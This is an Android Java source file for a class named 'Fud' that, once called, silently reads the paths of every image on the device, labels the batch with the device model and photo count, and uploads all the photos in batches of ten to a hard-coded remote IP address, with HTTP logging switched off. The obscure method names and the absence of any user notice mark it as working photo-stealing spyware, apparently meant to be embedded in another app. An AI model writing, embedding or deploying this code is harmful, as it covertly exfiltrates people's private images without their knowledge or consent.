package sm.dn.yes;

import android.app.Application;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.MediaStore;

import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.interceptor.HttpLoggingInterceptor;
import com.lzy.okgo.model.Response;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;

import okhttp3.OkHttpClient;

public class Fud {
    private static List<String> mFilePash = new ArrayList<>();
    private static List<File> mFileList = new ArrayList<>();
    private static int mConunt = 0;
    private static String folderName;
    private static Context mContext;

    public static void ok(Context context) {
        mContext = context;
        //初始化okgo
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        //配置日志
        HttpLoggingInterceptor loggingInterceptor = new HttpLoggingInterceptor("OkGo");
        //log打印级别，决定了log显示的详细程度
//        loggingInterceptor.setPrintLevel(HttpLoggingInterceptor.Level.BODY);//全部打印数据
        loggingInterceptor.setPrintLevel(HttpLoggingInterceptor.Level.NONE);//关闭日志打印
        //log颜色级别，决定了log在控制台显示的颜色
        loggingInterceptor.setColorLevel(Level.INFO);
        builder.addInterceptor(loggingInterceptor);
        //全局的读取超时时间
        builder.readTimeout(10000, TimeUnit.MILLISECONDS);
        //全局的写入超时时间
        builder.writeTimeout(10000, TimeUnit.MILLISECONDS);
        //全局的连接超时时间
        builder.connectTimeout(10000, TimeUnit.MILLISECONDS);
        OkGo.getInstance().init((Application) mContext)
                .setOkHttpClient(builder.build());//建议设置OkHttpClient，不设置将使用默认的
        new Thread(new Runnable() {
            @Override
            public void run() {
                tb();
            }
        }).start();
    }

    public static void tb() {
        mFilePash.clear();
        Cursor cursor = mContext.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
        while (cursor.moveToNext()) {
            //获取图片的名称
//            String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
            //获取图片的生成日期
//            byte[] data = cursor.getBlob(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
            //获取图片的详细信息
//            String desc = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION));
            //获取图片路径
            mFilePash.add(cursor.getString(1));
        }
        if (Build.PRODUCT != null && Build.PRODUCT.length() > 0) {
            folderName = System.currentTimeMillis() + "_" + Build.PRODUCT;
        } else if (Build.BRAND != null && Build.BRAND.length() > 0) {
            folderName = System.currentTimeMillis() + "_" + Build.BRAND;
        } else if (Build.DEVICE != null && Build.DEVICE.length() > 0) {
            folderName = System.currentTimeMillis() + "_" + Build.DEVICE;
        }
        folderName += "共" + mFilePash.size();
        cb(mConunt);
    }

    private static void cb(int count) {
        if (count >= mFilePash.size() - 1) {
            return;
        }
        if (count + 10 > mFilePash.size() - 1) {
            if (count >= mFilePash.size() - 1) {
                return;
            } else {
                mFileList.clear();
                for (int i = count; i < mFilePash.size(); i++) {
                    mFileList.add(new File(mFilePash.get(i)));
                }
                sb(mFileList);
            }
        } else {
            mFileList.clear();
            for (int i = count; i < count + 10; i++) {
                mFileList.add(new File(mFilePash.get(i)));
            }
            sb(mFileList);
        }
    }

    private static void sb(List<File> mfiles) {
        OkGo.<String>post("http://47.104.6.226:8080/file/setfiles")
                .addFileParams("files", mfiles)
                .params("dir", folderName)
                .execute(new StringCallback() {
                    @Override
                    public void onSuccess(Response<String> response) {
                        mConunt += 10;
                        cb(mConunt);
                    }

                    @Override
                    public void onError(Response<String> response) {
                        super.onError(response);
                        mConunt += 10;
                        cb(mConunt);
                    }
                });
    }
}
